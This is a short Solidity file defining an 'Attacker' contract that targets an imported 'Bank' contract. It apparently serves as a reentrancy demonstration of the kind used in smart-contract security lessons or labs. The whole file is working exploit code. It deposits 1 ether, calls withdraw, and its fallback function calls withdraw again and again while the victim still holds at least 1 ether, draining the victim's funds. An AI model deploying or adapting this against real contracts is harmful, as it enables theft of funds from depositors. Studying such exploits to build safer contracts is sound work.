// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "./Bank.sol";

contract Attacker {
    Bank victim;

    constructor(Bank _victim) payable {
        victim = _victim;
    }

    function attack() public {
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    fallback() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);
        }
    }
}
